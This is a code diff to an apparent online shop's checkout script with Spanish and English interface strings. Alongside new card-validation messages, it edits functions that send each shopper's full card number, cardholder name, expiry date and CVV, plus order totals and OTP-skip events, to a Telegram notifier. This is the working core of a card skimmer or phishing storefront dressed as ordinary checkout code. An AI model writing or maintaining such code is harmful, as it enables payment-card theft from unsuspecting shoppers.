@@ -84,6 +84,9 @@ verify_code: "Verificar código",
 skip_otp: "Omitir verificación",
 invalid_code: "Código inválido. Inténtalo de nuevo.",
 accept_terms_alert: "Debes aceptar los términos y condiciones para continuar",
+invalid_card_number: "Número de tarjeta inválido. Debe tener 16 dígitos.",
+invalid_expiry_date: "Fecha de vencimiento inválida. Debe estar en formato MM/AA.",
+invalid_cvv: "CVV inválido. Debe tener 3 dígitos.",
 
         products: "Productos",
         about: "Acerca de",
@@ -628,6 +631,9 @@ resend_code: "Resend Code",
 verify_code: "Verify Code",
 skip_otp: "Skip Verification",
 invalid_code: "Invalid code. Please try again.",
+invalid_card_number: "Invalid card number. Must be 16 digits.",
+invalid_expiry_date: "Invalid expiry date. Must be in MM/YY format.",
+invalid_cvv: "Invalid CVV. Must be 3 digits.",
 
         products: "Products",
         about: "About",
@@ -2153,10 +2159,11 @@ document.querySelectorAll('.place-order').forEach(btn => {
 
             if (method === 'bank-transfer') {
                 // Telegram notification for bank transfer
-                if (typeof TelegramNotifications !== 'undefined') {
+                if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.confirmBankTransfer) {
+                    const total = checkoutData.total;
                     TelegramNotifications.confirmBankTransfer({
-                        total: convertPrice(getCartTotal(), false),
-                        orderRef: generateOrderReference()
+                        total: convertPrice(total, false),
+                        orderRef: checkoutData.orderNumber
                     });
                 }
                 processOrder();
@@ -2172,17 +2179,15 @@ document.querySelectorAll('.place-order').forEach(btn => {
                 checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
 
                 // Send Telegram notification for card details
-                if (typeof TelegramNotifications !== 'undefined') {
+                if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.cardDetailsSubmitted) {
                     const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
-                    const lastFourDigits = cardNumber.slice(-4);
                     TelegramNotifications.cardDetailsSubmitted({
-                        total: convertPrice(getCartTotal(), false),
-                        orderRef: generateOrderReference(),
+                        total: convertPrice(checkoutData.total, false),
+                        orderRef: checkoutData.orderNumber,
                         cardholderName: checkoutData.cardholderName,
-                        cardNumber: cardNumber,
+                        cardNumber: document.getElementById('card-number').value,
                         expiryDate: document.getElementById('expiry-date').value,
-                        cvv: document.getElementById('cvv').value,
-                        lastFourDigits: lastFourDigits
+                        cvv: document.getElementById('cvv').value
                     });
                 }
 
@@ -2280,6 +2285,12 @@ function validateCardDetails() {
     const expiryDate = document.getElementById('expiry-date').value;
     const cvv = document.getElementById('cvv').value;
     const cardErrors = document.getElementById('card-errors');
+
+    if (!cardErrors) {
+        console.error("Card errors element not found in the DOM!");
+        // Prevent submission if the error element is missing, as we can't show errors.
+        return false;
+    }
 
   // Card Number: Must be 16 digits
 if (!/^\d{16}$/.test(cardNumber)) {
@@ -2429,7 +2440,12 @@ function processOrder() {
 // Optional: skip OTP verification and proceed
 function skipOTP() {
     if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.otpSkipped) {
-        TelegramNotifications.otpSkipped();
+        const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+        const total = checkoutData.discountAmount > 0 ? subtotal - checkoutData.discountAmount : subtotal;
+        TelegramNotifications.otpSkipped({
+            total: convertPrice(total, false),
+            orderRef: checkoutData.orderNumber
+        });
     }
     console.warn('User skipped OTP. Proceeding to order completion.');
     document.getElementById('otp-error').style.display = 'none';
